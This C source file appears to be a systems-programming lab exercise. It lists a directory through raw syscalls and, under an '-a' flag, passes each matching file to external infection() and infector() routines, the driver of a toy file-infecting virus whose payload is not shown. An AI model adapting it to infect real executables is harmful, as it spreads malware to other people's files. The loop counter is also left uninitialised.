#include "util.h"
#define SYS_WRITE 4
#define STDERR 2
#define STDOUT 1
#define OPEN 5
#define LSEEK 19

typedef struct ent
{
    int inode;
    int offset;
    short len;
    char buf[1];
} ent;
extern int code_start;
extern int code_end;
extern int system_call(int,...);
extern void infection();
extern void infector(char*);
int main(int argc, char *argv[], char *envp[])
{
    system_call(SYS_WRITE, STDOUT, "Flame 2 strikes!\n", 17);
    char buff[8192];
    int fd;
    int i;
    int j;
    char d_type;
    int DbugFlag = 0;
    int prefixFlag = 0;
    int aprefixFlag=0;
    char *prefix[1];
    ent *entp = (ent*)buff;
    int count = 0;
    system_call(SYS_WRITE, STDOUT, "code_start:", 11);
    system_call(SYS_WRITE, STDOUT, itoa(code_start),strlen(itoa(code_start)));
    system_call(SYS_WRITE, STDOUT, "\n",1);
    system_call(SYS_WRITE, STDOUT, "code_end:", 9);
    system_call(SYS_WRITE, STDOUT, itoa(code_end),strlen(itoa(code_end)));
    system_call(SYS_WRITE, STDOUT, "\n",1);
    for (j = 1; j < argc; j++)
    {
        if (argc > 1 && strcmp(argv[j], "-D") == 0)
        {
            DbugFlag = 1;
        }
        else if (argv[j][1] == 'p')
        {
            prefix[0] = argv[j] + 2;
            prefixFlag = 1;
        }
        else if (argv[j][1] == 'a')
        {
            infection();
            prefix[0] = argv[j] + 2;
            aprefixFlag = 1;
        }
        
    }
        fd = system_call(OPEN, ".", 0, 0);
        if (DbugFlag)
        {
            system_call(SYS_WRITE, STDERR, "ID:5\n", 5);
            system_call(SYS_WRITE, STDERR, "RETURN:", 7);
            system_call(SYS_WRITE, STDERR, itoa(fd), strlen(itoa(fd)));
            system_call(SYS_WRITE, STDERR, "\n", 1);
        }
        if (fd < 0)
        {
            system_call(1, 0X55, 0, 0);
        }
        count = system_call(141, fd, buff, 8192);
        if (DbugFlag)
        {
            system_call(SYS_WRITE, STDERR, "ID:141\n", 7);
            system_call(SYS_WRITE, STDERR, "RETURN:", 7);
            system_call(SYS_WRITE, STDERR, itoa(count), strlen(itoa(count)));
            system_call(SYS_WRITE, STDERR, "\n", 1);
        }
        entp = (ent*)buff;
        while( i < count)
        {
            entp =(ent*)(buff + i);
            if (DbugFlag)
            {
                system_call(SYS_WRITE, STDERR, "length:", 7);
                system_call(SYS_WRITE, STDERR, itoa(entp->len), strlen(itoa(entp->len)));
                system_call(SYS_WRITE, STDERR, "\n", 1);
                system_call(SYS_WRITE, STDERR, "name:", 5);
                system_call(SYS_WRITE, STDERR, entp->buf, strlen(entp->buf));
                system_call(SYS_WRITE, STDERR, "\n", 1);
            }
            if (prefixFlag && (strncmp(prefix[0], entp->buf, strlen(prefix[0])) == 0))
            {
                d_type=*(buff+i+entp->len-1);
                (d_type == 8) ?system_call(SYS_WRITE, STDOUT,"regular\n",8) :
                                    (d_type == 4) ? system_call(SYS_WRITE, STDOUT,"directory\n",10):
                                    (d_type == 1) ? system_call(SYS_WRITE, STDOUT,"FIFO\n", 5) :
                                    (d_type == 12) ?system_call(SYS_WRITE, STDOUT,"socket\n", 7) :
                                    (d_type == 10) ?system_call(SYS_WRITE, STDOUT,"symlink\n", 8) :
                                    (d_type == 6) ?system_call(SYS_WRITE, STDOUT,"block dev\n", 10) :
                                    (d_type == 2) ? system_call(SYS_WRITE, STDOUT,"char dev\n", 9) :
                                    system_call(SYS_WRITE, STDOUT,"unknown\n", 8);
                system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
                system_call(SYS_WRITE, STDOUT, "\n", 1);
            }
            else if(aprefixFlag && (strncmp(prefix[0], entp->buf, strlen(prefix[0])) == 0))
            {
                d_type=*(buff+i+entp->len-1);
                (d_type == 8) ?system_call(SYS_WRITE, STDOUT,"regular\n",8) :
                                    (d_type == 4) ? system_call(SYS_WRITE, STDOUT,"directory\n",10):
                                    (d_type == 1) ? system_call(SYS_WRITE, STDOUT,"FIFO\n", 5) :
                                    (d_type == 12) ?system_call(SYS_WRITE, STDOUT,"socket\n", 7) :
                                    (d_type == 10) ?system_call(SYS_WRITE, STDOUT,"symlink\n", 8) :
                                    (d_type == 6) ?system_call(SYS_WRITE, STDOUT,"block dev\n", 10) :
                                    (d_type == 2) ? system_call(SYS_WRITE, STDOUT,"char dev\n", 9) :
                                    system_call(SYS_WRITE, STDOUT,"unknown\n", 8);
                system_call(SYS_WRITE, STDOUT,entp->buf , strlen(entp->buf));
                system_call(SYS_WRITE, STDOUT, "\n", 1);
                infector(entp->buf);
            }
            else if (prefixFlag==0&&aprefixFlag==0)
            {
                system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
                system_call(SYS_WRITE, STDOUT, "\n", 1);
            }
             i +=entp->len;
        }
        return 0;
    }
